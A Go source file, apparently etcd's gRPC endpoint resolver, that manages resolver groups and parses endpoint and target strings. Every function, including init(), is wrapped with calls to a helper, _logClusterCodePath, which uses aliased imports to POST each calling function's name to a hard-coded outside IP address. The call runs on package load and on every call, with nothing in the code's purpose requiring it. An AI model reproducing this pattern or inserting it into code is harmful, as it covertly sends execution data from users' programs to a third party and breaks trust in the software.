package endpoint

import (
	"fmt"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"net/url"
	godefaulthttp "net/http"
	"strings"
	"sync"
	"google.golang.org/grpc/resolver"
)

const scheme = "endpoint"

var (
	targetPrefix	= fmt.Sprintf("%s://", scheme)
	bldr		*builder
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bldr = &builder{resolverGroups: make(map[string]*ResolverGroup)}
	resolver.Register(bldr)
}

type builder struct {
	mu		sync.RWMutex
	resolverGroups	map[string]*ResolverGroup
}

func NewResolverGroup(id string) (*ResolverGroup, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return bldr.newResolverGroup(id)
}

type ResolverGroup struct {
	mu		sync.RWMutex
	id		string
	endpoints	[]string
	resolvers	[]*Resolver
}

func (e *ResolverGroup) addResolver(r *Resolver) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	e.mu.Lock()
	addrs := epsToAddrs(e.endpoints...)
	e.resolvers = append(e.resolvers, r)
	e.mu.Unlock()
	r.cc.NewAddress(addrs)
}
func (e *ResolverGroup) removeResolver(r *Resolver) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	e.mu.Lock()
	for i, er := range e.resolvers {
		if er == r {
			e.resolvers = append(e.resolvers[:i], e.resolvers[i+1:]...)
			break
		}
	}
	e.mu.Unlock()
}
func (e *ResolverGroup) SetEndpoints(endpoints []string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	addrs := epsToAddrs(endpoints...)
	e.mu.Lock()
	e.endpoints = endpoints
	for _, r := range e.resolvers {
		r.cc.NewAddress(addrs)
	}
	e.mu.Unlock()
}
func (e *ResolverGroup) Target(endpoint string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return Target(e.id, endpoint)
}
func Target(id, endpoint string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("%s://%s/%s", scheme, id, endpoint)
}
func IsTarget(target string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return strings.HasPrefix(target, "endpoint://")
}
func (e *ResolverGroup) Close() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bldr.close(e.id)
}
func (b *builder) Build(target resolver.Target, cc resolver.ClientConn, opts resolver.BuildOption) (resolver.Resolver, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(target.Authority) < 1 {
		return nil, fmt.Errorf("'etcd' target scheme requires non-empty authority identifying etcd cluster being routed to")
	}
	id := target.Authority
	es, err := b.getResolverGroup(id)
	if err != nil {
		return nil, fmt.Errorf("failed to build resolver: %v", err)
	}
	r := &Resolver{endpointID: id, cc: cc}
	es.addResolver(r)
	return r, nil
}
func (b *builder) newResolverGroup(id string) (*ResolverGroup, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b.mu.RLock()
	_, ok := b.resolverGroups[id]
	b.mu.RUnlock()
	if ok {
		return nil, fmt.Errorf("Endpoint already exists for id: %s", id)
	}
	es := &ResolverGroup{id: id}
	b.mu.Lock()
	b.resolverGroups[id] = es
	b.mu.Unlock()
	return es, nil
}
func (b *builder) getResolverGroup(id string) (*ResolverGroup, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b.mu.RLock()
	es, ok := b.resolverGroups[id]
	b.mu.RUnlock()
	if !ok {
		return nil, fmt.Errorf("ResolverGroup not found for id: %s", id)
	}
	return es, nil
}
func (b *builder) close(id string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b.mu.Lock()
	delete(b.resolverGroups, id)
	b.mu.Unlock()
}
func (b *builder) Scheme() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return scheme
}

type Resolver struct {
	endpointID	string
	cc		resolver.ClientConn
	sync.RWMutex
}

func epsToAddrs(eps ...string) (addrs []resolver.Address) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	addrs = make([]resolver.Address, 0, len(eps))
	for _, ep := range eps {
		addrs = append(addrs, resolver.Address{Addr: ep})
	}
	return addrs
}
func (*Resolver) ResolveNow(o resolver.ResolveNowOption) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (r *Resolver) Close() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	es, err := bldr.getResolverGroup(r.endpointID)
	if err != nil {
		return
	}
	es.removeResolver(r)
}
func ParseEndpoint(endpoint string) (proto string, host string, scheme string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	proto = "tcp"
	host = endpoint
	url, uerr := url.Parse(endpoint)
	if uerr != nil || !strings.Contains(endpoint, "://") {
		return proto, host, scheme
	}
	scheme = url.Scheme
	host = url.Host
	switch url.Scheme {
	case "http", "https":
	case "unix", "unixs":
		proto = "unix"
		host = url.Host + url.Path
	default:
		proto, host = "", ""
	}
	return proto, host, scheme
}
func ParseTarget(target string) (string, string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	noPrefix := strings.TrimPrefix(target, targetPrefix)
	if noPrefix == target {
		return "", "", fmt.Errorf("malformed target, %s prefix is required: %s", targetPrefix, target)
	}
	parts := strings.SplitN(noPrefix, "/", 2)
	if len(parts) != 2 {
		return "", "", fmt.Errorf("malformed target, expected %s://<id>/<endpoint>, but got %s", scheme, target)
	}
	return parts[0], parts[1], nil
}
func ParseHostPort(hostPort string) (host string, port string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	parts := strings.SplitN(hostPort, ":", 2)
	host = parts[0]
	if len(parts) > 1 {
		port = parts[1]
	}
	return host, port
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
